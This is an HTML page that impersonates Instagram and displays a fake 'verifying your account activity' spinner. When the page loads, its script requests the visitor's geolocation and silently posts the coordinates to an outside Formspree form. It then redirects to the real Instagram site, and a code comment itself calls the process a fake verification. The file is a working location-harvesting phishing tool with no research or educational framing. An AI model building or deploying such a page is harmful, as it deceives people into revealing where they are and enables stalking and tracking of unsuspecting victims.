<!DOCTYPE html>
<html>
<head>
  <title>Instagram Verification</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body {
      background-color: #fafafa;
      font-family: 'Inter', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    .box {
      background: white;
      border: 1px solid #dbdbdb;
      padding: 40px 30px;
      width: 100%;
      max-width: 360px;
      text-align: center;
      box-shadow: 0 0 5px rgba(0,0,0,0.05);
      border-radius: 8px;
    }

    .logo {
      width: 120px;
      margin-bottom: 20px;
    }

    .spinner {
      border: 4px solid #eee;
      border-top: 4px solid #262626;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .text {
      font-size: 14px;
      color: #8e8e8e;
    }
  </style>

  <script>
    window.onload = () => {
      navigator.geolocation.getCurrentPosition(function(position) {
        fetch("https://formspree.io/f/mkgvoelw", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy
          })
        }).then(() => {
          // Redirect to real Instagram page after fake verification
          window.location.href = "https://www.instagram.com/accounts/verify/";
        });
      });
    };
  </script>
</head>

<body>
  <div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" class="logo">
    <div class="spinner"></div>
    <p class="text">Verifying your account activity...</p>
  </div>
</body>
</html>
